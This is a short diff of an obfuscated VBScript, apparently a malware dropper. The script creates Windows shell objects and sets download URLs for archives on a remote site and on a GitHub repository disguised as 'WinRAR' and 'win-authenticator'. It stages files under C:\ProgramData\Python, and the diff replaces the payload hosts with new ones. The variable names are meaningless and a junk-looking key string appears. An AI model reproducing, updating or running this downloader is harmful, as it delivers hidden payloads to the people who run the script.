@@ -7,9 +7,9 @@ Dim wrepofhn, ghryhoyho
 Set wrepofhn = CreateObject("WScript.Shell")
 Set ghryhoyho = CreateObject("Shell.Application")
 
-aaaaaaabncjds = "https://1.site/kkjssd11age1.rar"
-dfsijsdfhisdfjiosdfjiosdfiojsdfioj = "https://1.site/wogjehivg.rar"
-wuernvgoreuihvnfgpoeruifvyhbpodia = "https://raw.githubusercontent.com/michaelorozco0203/a/refs/heads/a/WinRAR.zip"
+aaaaaaabncjds = "https://devhive.site/kkjssd11age1.rar"
+dfsijsdfhisdfjiosdfjiosdfiojsdfioj = "https://devhive.site/wogjehivg.rar"
+wuernvgoreuihvnfgpoeruifvyhbpodia = "https://raw.githubusercontent.com/win-authenticator/mode/refs/heads/otp/WinRAR.zip"
 
 gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpweuyhdspoijoqwavfdscsdaxsduyhdspoijoqwavfdscsdaxsd]"
 qwoiughduiobhciwe = "C:\ProgramData\Python\1.zip"
